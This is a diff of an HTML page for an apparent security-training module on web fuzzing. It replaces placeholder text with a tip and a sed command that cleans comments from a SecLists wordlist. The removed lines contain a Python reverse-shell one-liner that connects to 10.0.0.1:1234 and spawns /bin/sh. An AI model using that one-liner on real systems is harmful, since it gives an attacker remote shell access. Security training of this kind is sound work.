@@ -1,45 +1,54 @@
-<div class="container-fluid">
+<div class="container">
     <div id="layout-wrapper">
         <div class="main-content">
             <div class="page-content">
-                <div class="row">
-                    <div class="col-md-12">
+                <div class="row justify-content-xl-center">
+                    <div class="col-md-12 col-xl-12 col-xxl-12">
                         <div class="training-module">
-                            <h1>Lorem Ipsum</h1>
-                            <hr>
-                            <p> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce ac elementum mi. Donec tincidunt ligula dui, sit amet feugiat magna pretium id. Nulla facilisis dictum diam, at pulvinar sapien ultrices vulputate. Maecenas pellentesque
-                                a mi at viverra. Morbi ac placerat risus. Nam rhoncus nunc placerat nisi pulvinar pulvinar. Maecenas luctus molestie justo, ac ultricies risus egestas vitae. In finibus tristique urna ac elementum. Ut sit amet felis diam.
-                                Ut vulputate mollis nibh a fermentum. Aenean erat diam, consectetur a lectus a, semper blandit quam. Vivamus hendrerit leo non purus porttitor, et posuere ante hendrerit. Nunc mauris ipsum, suscipit in velit sit amet, sollicitudin
-                                interdum massa. Suspendisse commodo viverra urna blandit vehicula. Morbi molestie vulputate fermentum. Donec urna ante, consequat et pharetra nec, blandit eget lorem. Nunc eu leo sit amet ipsum vehicula lobortis. In vehicula
-                                metus id enim tristique faucibus nec quis nisi. Nulla facilisi. In eget mauris turpis. Donec fringilla elementum lacus, sit amet egestas quam porttitor in. Orci varius natoque penatibus et magnis dis parturient montes,
-                                nascetur ridiculus mus. Proin pretium eros nec elementum rutrum. Nunc eget feugiat diam, fringilla tempor augue. Nunc sodales mauris ut maximus egestas. Pellentesque euismod enim at fermentum aliquet. Phasellus sapien lectus,
-                                placerat eget volutpat in, mollis eu sem. Sed lobortis metus velit, accumsan faucibus dolor fermentum eu. Sed at tristique lacus, posuere venenatis urna. Duis non enim et turpis consequat auctor eget id odio. </p>
-
-                            <p>Sed at tristique lacus, posuere venenatis urna.</p>
-                            <h4>Nunc sodales mauris</h4>
-                            <p> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce ac elementum mi. Donec tincidunt ligula dui, sit amet feugiat magna pretium id. Nulla facilisis dictum diam, at pulvinar sapien ultrices vulputate. Maecenas pellentesque
-                                a mi at viverra. Morbi ac placerat risus. Nam rhoncus nunc placerat nisi pulvinar pulvinar. Maecenas luctus molestie justo, ac ultricies risus egestas vitae. In finibus tristique urna ac elementum. Ut sit amet felis diam.
-                                Ut vulputate mollis nibh a fermentum. Aenean erat diam, consectetur a lectus a, semper blandit quam. Vivamus hendrerit leo non purus porttitor, et posuere ante hendrerit. Nunc mauris ipsum, suscipit in velit sit amet, sollicitudin
-                                interdum massa. Suspendisse commodo viverra urna blandit vehicula. Morbi molestie vulputate fermentum. Donec urna ante, consequat et pharetra nec, blandit eget lorem. Nunc eu leo sit amet ipsum vehicula lobortis. In vehicula
-                                metus id enim tristique faucibus nec quis nisi. Nulla facilisi. In eget mauris turpis. Donec fringilla elementum lacus, sit amet egestas quam porttitor in. Orci varius natoque penatibus et magnis dis parturient montes,
-                                nascetur ridiculus mus. Proin pretium eros nec elementum rutrum. </p>
+                            <h1>Web Fuzzing</h1>
+                            <hr />
+                            <div class="card bg-light">
+                                <div class="card-body">
+                                    <p class="mb-0">Tip: Taking a look at this wordlist we will notice that it contains copyright comments at the beginning, which can be considered as part of the wordlist and clutter the results. We can use the following command to get
+                                        rid of these lines:</p>
+                                </div>
+                            </div>
+                            <h4>Removing Comments</h4>
                             <div class="window_container">
                                 <div class="window_content">
                                     <div class="window_top">
                                         <span class="window_dot bg-danger"></span>
                                         <span class="window_dot bg-warning"></span>
                                         <span class="window_dot bg-success"></span>
-                                        <span class="window_title">555</span>
+                                        <span class="window_title">Removing Comments</span>
                                     </div>
-                                    <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token info punctuation"></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sudo apt update</span></span></span>
-
-<span class="token output">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-    s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-</span></code></pre></div>
+                                    <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">CRYSTHOFFER@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sudo</span> <span class="token function">sed</span> -i <span class="token string">'s/^\#.*$//g'</span> /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">sed</span> -i <span class="token string">'/^$/d'</span> /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</span></span>
+</code></pre></div>
+                            </div>
+                        </div>
+                        <div class="card bg-color-blue-nav" style="margin: 30px 0">
+                            <div class="card-body">
+                                <form action="https://academy.hackthebox.com/module" method="POST">
+                                    <input type="hidden" name="module_id" value="54">
+                                    <input type="hidden" name="page_id" value="1">
+                                    <button class="btn btn-light module-button py-2" style="float: left"><i class="fa fa-arrow-alt-left mr-1"></i> Previous</button>
+                                </form>
+                                <form action="https://academy.hackthebox.com/module" method="POST" class="form-inline" id="completeForm" style="float: right">
+                                    <input type="hidden" name="module_id" value="54">
+                                    <input type="hidden" name="page_id" value="3">
+                                    <input type="hidden" name="completed" value="1">
+                                    <button id="completeBtn" class="btn btn-outline-success" style="display:none;"><i class="fa fa-check-circle"></i> Mark Complete & Next</button>
+                                </form>
+                                <form action="https://academy.hackthebox.com/module" method="POST">
+                                    <input type="hidden" name="module_id" value="54">
+                                    <input type="hidden" name="page_id" value="3">
+                                    <button class="btn btn-light ml-2 module-button py-2" style="float: left">Next <i class="ml-1 fa fa-arrow-alt-right"></i></button>
+                                </form>
                             </div>
                         </div>
                     </div>
                 </div>
+
             </div>
         </div>
     </div>
